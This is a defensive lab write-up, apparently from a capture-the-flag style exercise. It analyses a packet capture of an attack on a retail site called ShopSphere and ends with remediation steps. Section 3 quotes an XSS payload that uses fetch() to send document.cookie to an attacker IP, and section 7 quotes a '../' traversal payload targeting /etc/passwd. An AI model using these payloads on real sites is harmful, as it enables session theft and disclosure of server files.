@@ -1,0 +1,122 @@
+# ShopSphere Security Incident Investigation – Wireshark PCAP Analysis
+
+## Overview
+
+In this lab, I investigated suspicious network traffic involving ShopSphere, an online retail platform experiencing unusual administrative login activity and customer account anomalies. The objective was to identify the attacker's IP address, determine the techniques used, and reconstruct the attack timeline.
+
+I used Wireshark to analyze the captured network traffic, investigate suspicious HTTP requests, and identify evidence of potential web application compromise.
+
+## Tools Used
+
+- Wireshark
+- CyberChef
+- HTTP traffic analysis
+- Wireshark display filters and HTTP stream inspection
+
+## Investigation Process
+
+### 1. Identifying the Attacker's IP Address
+
+I analyzed the IP addresses in the packet capture and looked for unusual network activity. I identified 111.224.180.128 as the suspected attacker's IP address and used it to filter relevant traffic during the investigation.
+
+### 2. Detecting Directory Brute-Forcing Activity
+
+I applied the following Wireshark display filter to identify HTTP 404 responses:
+
+`http.response.code == 404`
+
+I inspected the relevant HTTP streams and examined the User-Agent header. This revealed that the attacker used Gobuster to perform directory brute-forcing and discover hidden paths on the web server.
+
+### 3. Analyzing the XSS Payload
+
+I searched for suspicious HTTP requests originating from the attacker's IP address that contained script-related content.
+
+Display filter:
+
+`ip.src == 111.224.180.128 and http contains "script"`
+
+After locating a suspicious POST request, I followed the HTTP stream and used CyberChef's URL Decode operation to inspect the payload.
+
+The identified JavaScript payload was:
+
+`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
+
+This payload attempts to send the victim's browser cookies to the attacker's server. If the session cookie is accessible to JavaScript, this could allow the attacker to steal session information and potentially impersonate the victim.
+
+### 4. Establishing the Attack Timeline
+
+To determine when the administrator visited the affected page, I filtered HTTP requests to `/reviews.php`, excluding traffic originating from the attacker's IP address.
+
+Display filter:
+
+`ip.src != 111.224.180.128 and http.request.uri contains "reviews.php"`
+
+I reviewed the administrator's requests and identified the visit that occurred after the malicious script had been injected.
+
+The recorded UTC timestamp was:
+
+2024-03-29 12:09 UTC
+
+This helped establish when the administrator may have encountered the injected script.
+
+### 5. Identifying the Stolen Session Token
+
+I inspected subsequent HTTP traffic associated with the administrator's IP address, focusing on session cookies and request headers.
+
+The session token identified in the lab was:
+
+`xxxxxxxxxxxxxxxxxxxxxxx`
+
+This finding was consistent with the suspected session hijacking activity.
+
+### 6. Identifying the Exploited PHP Script
+
+I filtered traffic originating from the attacker's IP address and searched for requests containing the identified session token.
+
+Display filter:
+
+`ip.src == 111.224.180.128 and http and frame contains "lqkctf24s9h9lg67teu8uevn3q"`
+
+By inspecting the requested PHP paths, I identified `log_viewer.php` as the script associated with the exploitation activity.
+
+### 7. Investigating the Directory Traversal Payload
+
+I examined the attacker's HTTP requests to `log_viewer.php` and searched for directory traversal sequences in the request parameters.
+
+The identified payload was:
+
+`../../../../../etc/passwd`
+
+This payload attempts to navigate outside the intended application directory and access the Linux `/etc/passwd` file. It indicates a directory traversal or potential Local File Inclusion (LFI) attempt, depending on how the application handles the supplied path.
+
+## Attack Summary
+
+The investigation identified a sequence of suspicious activities:
+
+1. The attacker used Gobuster to discover hidden paths on the web server.
+2. A JavaScript payload was injected into the application to attempt to steal browser cookies through an XSS vulnerability.
+3. The administrator subsequently visited the affected `/reviews.php` page, potentially triggering the malicious script.
+4. A session token was identified in the captured traffic, consistent with suspected session hijacking.
+5. The attacker interacted with `log_viewer.php` and submitted a directory traversal payload targeting `/etc/passwd`.
+
+These findings suggest a potential attack chain involving reconnaissance, cross-site scripting, session theft, unauthorized access, and an attempt to access sensitive server files.
+
+## Recommended Incident Response Actions
+
+- Remove the injected script and investigate the vulnerable application functionality.
+- Invalidate affected sessions and require the administrator to authenticate again.
+- Review administrator activity and audit logs to determine which resources were accessed.
+- Investigate `log_viewer.php` for directory traversal and file inclusion vulnerabilities.
+- Restrict file access to approved directories and validate file paths securely.
+- Apply context-aware output encoding and appropriate input validation to prevent XSS.
+- Configure secure cookie attributes, including HttpOnly, Secure, and SameSite where appropriate.
+- Review web server logs for additional suspicious requests and potential data access.
+- Consider blocking the identified IP address where appropriate, while addressing the underlying vulnerabilities.
+
+## Key Takeaways
+
+This lab strengthened my practical skills in PCAP analysis, HTTP traffic investigation, Wireshark filtering, HTTP stream inspection, XSS analysis, session hijacking investigation, directory brute-forcing detection, and directory traversal analysis.
+
+It also reinforced the importance of correlating network events, reconstructing attack timelines, and using evidence to guide incident response decisions.
+
+The exercise demonstrated how multiple web application vulnerabilities can combine to threaten account security and server confidentiality, and how network traffic analysis can help a SOC analyst investigate and respond to a potential security incident.
